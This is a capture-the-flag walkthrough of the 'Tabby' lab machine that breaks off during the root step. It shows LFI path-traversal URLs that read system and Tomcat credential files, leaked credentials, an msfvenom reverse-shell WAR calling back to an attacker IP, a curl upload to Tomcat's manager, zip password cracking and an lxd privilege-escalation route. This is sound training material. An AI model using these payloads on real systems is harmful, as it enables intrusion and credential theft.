## Enumeration

Add `tabby` to `hosts` and start an `nmap` scan.

### Nmap

```

We have an `Apache` web app running on port 80 and a default `tomcat` installation on port 8080.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/tabby/web.png){: .align-center}
    
Browsing around we can see that there is a link for a news article with the following url.

```bash
http://tabby.com/news.php?file=statement
```

This look like a prime candidate for `LFI`

### LFI

After some fuzzing I was able to access `/etc/passwd`. But I couldn't find any other file that could be interesting.

```bash
http://tabby.com/news.php?file=../../../../../../../../../../etc/passwd
```

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/tabby/lfi.png){: .align-center}

Lets see if there is anything interesting in `tomcat`.

### Tomcat

Looking at the default page, we can see that `Tomcat` has something called `host-manger` and `manager`. 

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/tabby/manager.png){: .align-center}

> The Tomcat Host Manager application enables you to create, delete, and otherwise manage virtual hosts within Tomcat. This how-to guide is best accompanied by the following pieces of documentation:

>The Host Container for more information about the underlying xml configuration of virtual hosts and description of attributes.

>The Tomcat Host Manager application is a part of Tomcat installation, by default available using the following context: /host-manager. You can use the host manager in the following ways:

>    Utilizing the graphical user interface, accessible at: {server}:{port}/host-manager/html.
>    Utilizing a set of minimal HTTP requests suitable for scripting. You can access this mode at: {server}:{port}/host-manager/text.


So essentially `host-manager` is used to manage virtual hosts whereas `manager` can be used to manage and deploy new applications. There are two ways to access these functionality. Either via GUI or via command line tools such as `curl`. To access this we require the credentials stored in `tomcat-users.xml` and also proper access roles must be defined in `tomcat-users.xml` file. Lets try accessing this file using the `LFI` in `Apache` application.

Locating the correct path of `tomcat-users.xml` can be difficult. As some users pointed out in the htb forum, installing `tomcat` locally can help you easily identify the location.

We can access the file using 

```bash
http://tabby.com/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

We have some credential for user `tomcat`. This user also have access of `host-manager` GUI and script access as `manager`.


## Low Shell

There is a very interesting feature available using `manager-script`.

>Deploy A New Application Archive (WAR) Remotely

 >   http://localhost:8080/manager/text/deploy?path=/foo

>    Upload the web application archive (WAR) file that is specified as the request data in this HTTP PUT request, install it into the appBase directory of our corresponding virtual host, and start, deriving the name for the WAR file added to the appBase from the specified path. The application can later be undeployed (and the corresponding WAR file removed) by use of the /undeploy command.

>    This command is executed by an HTTP PUT request.

>    The .WAR file may include Tomcat specific deployment configuration, by including a Context configuration XML file in /META-INF/context.xml.

We can deploy a new application using a `PUT` request containing the `WAR` file that contains the web application. And some bad things can happen when an attacker has control of the contents of `WAR` file.


1. Create a `WAR` file using `msfvenom`
    ```bash
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=1337 -f war > $htb/tabby/shell.
    war

    Payload size: 1093 bytes
    Final size of war file: 1093 bytes
    ```

2. Upload the file via `curl` PUT request with the credentials in the header and the `WAR` file as the payload.  
    ```bash
    kali@kali:~/Desktop/htb/tabby$ curl -T shell.war -X PUT tabby.com:8080/manager/text/deploy?path=/shell -H "Authorization: Basic dG9tY2F0OiQzY3VyZVA0czV3MHJkMTIzIQ=="
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
      0  1092    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0OK - Deployed application at context path [/shell]
    100  1143    0    51  100  1092     34    739  0:00:01  0:00:01 --:--:--   773
    ```

3. Start a `nc` listener and browse the newly deployed application for our reverse shell.
```bash
kali@kali:~/Desktop/htb/tabby$ nc -lvp 1337
listening on [any] 1337 ...
connect to [10.10.14.29] from tabby.com [10.10.10.194] 45882
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ id
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

## User Shell

Looking around, found a password protected `zip` file. 

```bash
tomcat@tabby:/var/www/html/files$ file 16162020_backup.zip
file 16162020_backup.zip
16162020_backup.zip: Zip archive data, at least v1.0 to extract
```
Transfer it to our system. We can try cracking it using `fcrackzip`. 

```bash
kali@kali:~/Desktop/htb/tabby$ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' bak.zip


PASSWORD FOUND!!!!: pw == admin@it
```

Try using this in our shell for user `ash`.

```bash
tomcat@tabby:/var/www/html/files$ su ash
su ash
Password: admin@it

ash@tabby:/var/www/html/files$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

And we are `ash`

## Root Shell

Looking at the userid and the home directory, we can see that `lxd` is used. This is a software used for creating containers. There is a privilege escalation exploit available for this.

```bash
kali@kali:~/Desktop/tools$ searchsploit lxd
------------------------------------------------------------------------------------------ ----------------------------------------

                                                                                          | (/usr/share/exploitdb/)

```

There is a very convenient [lxd exploit](https://github.com/initstring/lxd_root/blob/master/lxd_rootv1.sh) script we can use. There is also a [detailed writeup](https://initblog.com/2019/lxd-root) regarding this issue. We can run this script to `sudo` without password.

1. List the containers.
2. Run the script with the container name.
3. Enjoy `sudo` privileges.

```bash
ash@tabby:~$ lxc list
lxc list
